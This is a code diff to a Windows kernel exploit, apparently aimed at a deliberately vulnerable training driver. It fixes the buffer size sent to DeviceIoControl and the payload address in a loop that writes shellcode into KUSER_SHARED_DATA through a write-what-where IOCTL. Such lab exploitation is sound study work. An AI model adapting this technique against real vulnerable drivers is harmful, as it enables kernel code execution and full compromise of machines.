@@ -156,7 +156,7 @@ struct write_what_where SendToDriver(HANDLE deviceHandle,int IOCode, void* what,
     whatWhere.what = what;
     whatWhere.where = where;
     
-    DeviceIoControl(deviceHandle,IOCode ,&whatWhere,sizeof(whatWhere)+5,NULL,0,bytesReturned, NULL );
+    DeviceIoControl(deviceHandle,IOCode ,&whatWhere,8,NULL,0,bytesReturned, NULL );
 
     return whatWhere;
 }
@@ -329,8 +329,7 @@ void *GenerateShellCode(HANDLE driverHandle)
 
     for (int i = 0; i < payloadSizeInEight;i++)
     {
-        
-        SendToDriver(driverHandle,0x0022200B,(void*) ( ( (unsigned long long)payload)+i), (void*) (((unsigned long long)KUSER_SHARED_DATA)+i) );
+        SendToDriver(driverHandle,0x0022200B,(void*) ( ( (unsigned long long)&payload)+i), (void*) (((unsigned long long)KUSER_SHARED_DATA)+i) );
     }
 
     return (void*) KUSER_SHARED_DATA;
